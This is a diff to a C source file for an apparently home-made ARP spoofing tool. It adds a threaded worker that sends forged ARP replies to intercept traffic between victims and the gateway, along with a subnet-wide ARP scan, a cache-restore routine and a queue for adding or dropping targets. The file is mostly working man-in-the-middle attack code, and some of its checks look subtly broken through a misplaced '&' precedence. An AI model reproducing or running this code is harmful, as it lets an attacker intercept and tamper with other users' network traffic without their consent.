@@ -1,6 +1,26 @@
 #include "cheater.h"
 
+#include <pthread.h>
+#include <stdlib.h>
+
 #include "common.h"
+#include "net_state.h"
+#include "queue.h"
+
+
+pthread_t   cheater             = 0;
+void        *queue              = 0;
+
+// cheater control code
+struct c_c_c
+{
+    unsigned int    type;
+#define ADD_MITM_WITH_ROUTE                     0
+#define ADD_MITM_IM_ROUTE                       1
+#define DELETE_TARGET                           2
+
+    unsigned int    target;
+};
 
 
 
@@ -90,31 +110,15 @@ cheater_arp_request_broadcast_sender(
 int
 cheater_arp_throw_shit(unsigned int target, unsigned int iwannabe)
 {
-    unsigned int    tidx    = _ntoh32(target & (~net_info->ip_mask));
-    unsigned int    iidx    = _ntoh32(iwannabe & (~net_info->ip_mask));
-
-    if(iidx > net_info->d_arr_max || tidx > net_info->d_arr_max)
+    if(false == is_device_online(target) & is_device_online(iwannabe))
     {
-        _MESSAGE_OUT("[!] wtf??? \n");
         return false;
     }
 
-    if(false == net_info->d_arr[iidx].is_online)
-    {
-        _MESSAGE_OUT("[!] %s is not online!\n", _netint32toip(iwannabe));
-        return false;
-    }
-    if(false == net_info->d_arr[tidx].is_online)
-    {
-        _MESSAGE_OUT("[!] %s is not online!\n", _netint32toip(target));
-        return false;
-    }
-
-
-    return cheater_arp_reply_sender(    net_info->d_arr[tidx].mac,
-                                        net_info->mac,
-                                        target,
-                                        iwannabe);
+    return cheater_arp_reply_sender(device_mac_address(target),
+                                    my_mac_address(),
+                                    target,
+                                    iwannabe);
 }
 
 
@@ -125,68 +129,249 @@ cheater_arp_mitm(unsigned int t1, unsigned int t2)
 }
 
 
-void
-cheater_test(void)
+int
+cheater_arp_im_route(unsigned int target_netint32)
 {
-#if 0
-    int i=254;
-    int ip  = _iptonetint32("192.168.1.0");
-    while(i --)
+    return cheater_arp_throw_shit(target_netint32, route_ip_netint32());
+}
+
+
+int
+cheater_arp_with_route(unsigned int target_netint32)
+{
+    return cheater_arp_mitm(target_netint32, route_ip_netint32());
+}
+
+
+int
+cheater_arp_mitm_restore(unsigned int target)
+{
+    if(false == 
+        is_device_online(target) & is_device_online(route_ip_netint32()) )
     {
-        sleep(0);
-
-        ip  = ip & 0xffffff00 | i;
-        cheater_arp_request_broadcast_sender( //"\x22\x22\x22\x22\x22\x22",
-                                    "\xd4\x33\xa3\x11\x11\x11",
-                                    // _iptonetint32("192.168.1.9"),
-                                    ip,
-                                    _iptonetint32("192.168.1.109"));
-
+        return false;
     }
-#endif
-    _MESSAGE_OUT("=======%s\n", __func__);
 
-    // int i=0;
-    // int n = 0;
-    // while(1)
-    // {
-    //     for(i=0; i<net_info->d_arr_max; i++)
-    //     {
-    //         if(cheater_arp_request_broadcast_sender(
-    //             net_info->mac,
-    //             net_info->ip_netint32 & net_info->ip_mask | _ntoh32(i),
-    //             net_info->ip_netint32))
-    //         {
-
-    //             // printf("send %d\n", n++);
-
-
-    //         }        
-    //     }
-    // }
- 
-
-    net_info->d_arr[104].is_online      = true;
-    memcpy(net_info->d_arr[104].mac, "\x24\x24\xe\x41\x58\xc7", 6);
-    net_info->d_arr[104].ip_netint32    = _iptonetint32("192.168.1.104");
-
-    net_info->d_arr[1].is_online        = true;
-    memcpy(net_info->d_arr[1].mac, "\xd8\x15\xd\x8c\x4\xfe", 6);
-    net_info->d_arr[1].ip_netint32      = _iptonetint32("192.168.1.1");
-
-
-    while(1)
-    {
-        cheater_arp_mitm(_iptonetint32("192.168.1.104"), net_info->ip_route_netint32);
-        sleep(1);
-    }
+    return  cheater_arp_reply_sender(   device_mac_address(target),
+                                        device_mac_address(route_ip_netint32()),
+                                        target,
+                                        route_ip_netint32()) &&
+            cheater_arp_reply_sender(   device_mac_address(route_ip_netint32()),
+                                        device_mac_address(target),
+                                        route_ip_netint32(),
+                                        target);
 }
 
 
 
+void
+cheater_arp_ask_all(void)
+{
+    int i   = 0;
+    int max = device_max();
+    for(i=0; i<max; i++)
+    {
+        cheater_arp_request_broadcast_sender(
+                    my_mac_address(),
+                    merge_device_index_to_ip_netint32(i),
+                    my_ip_netint32());
+    }
+}
 
 
+void
+cheater_set_cheat_off_all(void)
+{
+    int i   = 0;
+    int max = device_max();
+    for(i=0; i<max; i++)
+    {
+        set_cheat_state_clean(merge_device_index_to_ip_netint32(i));
+    }
+}
 
+
+void
+cheater_thread_worker_sender(void)
+{
+    int             i       = 0;
+    unsigned int    target  = 0;
+    unsigned char   state   = 0;
+    int             max     = device_max();
+
+    int (*cheater_fun)(unsigned int)    = 0;
+
+    for(i=0; i<max; i++)
+    {
+        target  = merge_device_index_to_ip_netint32(i);
+        state   = get_cheat_state(target);
+
+        if(CHEAT_OFF == state)
+        {
+            continue;
+        }
+
+        switch(get_cheat_mode(target))
+        {
+            case CHEAT_MODE_MITM:
+                cheater_fun = cheater_arp_with_route;
+                break;
+            case CHEAT_MODE_TARGET:
+                cheater_fun = cheater_arp_im_route;
+                break;
+            default:
+                cheater_fun = cheater_arp_with_route;
+                break;
+        }
+
+        if(CHEAT_ON == state)
+        {
+            (*cheater_fun)(target);
+            continue;
+        }
+
+        if(CHEAT_DELAY == state)
+        {
+            cheater_arp_mitm_restore(target);
+            continue;
+        }
+    }
+}
+
+
+void*
+cheater_thread_worker(void *mq)
+{
+    struct c_c_c    *cm = 0;
+    unsigned int    len = 0;
+    int             ret = 0;
+    cheater_set_cheat_off_all();
+
+    do
+    {
+        sleep(1);
+        cheater_thread_worker_sender();
+
+        for(;;)
+        {
+            cm  = 0;
+            ret = queue_read_message(mq, &cm, &len, 0);
+            if(QEUUE_NO_MSG == ret || 0 == cm || QUEUE_END == ret)
+            {
+                break;
+            }
+
+            switch(cm->type)
+            {
+                case ADD_MITM_WITH_ROUTE:
+                    set_cheat_on(cm->target);
+                    set_cheat_mode(cm->target, CHEAT_MODE_MITM);
+                    break;
+                case ADD_MITM_IM_ROUTE:
+                    set_cheat_on(cm->target);
+                    set_cheat_mode(cm->target, CHEAT_MODE_TARGET);
+                    break;
+                case DELETE_TARGET:
+                    set_cheat_off(cm->target);
+                    break;
+            }
+        }
+    }while(QUEUE_END != ret);
+
+    int i = 12;
+    do
+    {
+        cheater_thread_worker_sender();
+        sleep(1);
+    }while( i -- );
+
+    return 0;
+}
+
+
+int
+cheater_start(void)
+{
+    int err = 0;
+
+    queue   = queue_create(0, 0);
+    if(0 == queue || cheater)
+    {
+        return false;
+    }
+
+    err = pthread_create(&cheater, 0, cheater_thread_worker, queue);
+    if(err)
+    {
+        queue = queue_destory(queue);
+        return false;
+    }
+
+    return true;
+}
+
+
+void
+cheater_stop(void)
+{
+    if(queue)
+    {
+        queue_write_end(queue);
+        queue   = 0;
+    }
+}
+
+
+int
+cheater_add(unsigned int ip_netint32, unsigned char mode)
+{
+    struct c_c_c    cm  = {0};
+
+    if(0 == queue)
+    {
+        return false;
+    }
+
+    cm.type     = (mode == 0 ? ADD_MITM_WITH_ROUTE : ADD_MITM_IM_ROUTE);
+    cm.target   = ip_netint32;
+
+    queue_write_message(queue, &cm, sizeof(struct c_c_c), 0);
+
+    return true;
+}
+
+
+int
+cheater_add_mitm(unsigned int ip_netint32)
+{
+    return cheater_add(ip_netint32, 0);
+}
+
+
+int
+cheater_delete(unsigned int ip_netint32)
+{
+    struct c_c_c    cm  = {0};
+
+    if(0 == queue)
+    {
+        return false;
+    }
+
+    cm.type     = DELETE_TARGET;
+    cm.target   = ip_netint32;
+
+    queue_write_message(queue, &cm, sizeof(struct c_c_c), 0);
+
+    return true;
+}
+
+
+void
+cheater_scan(void)
+{
+    cheater_arp_ask_all();
+}
 
 
 
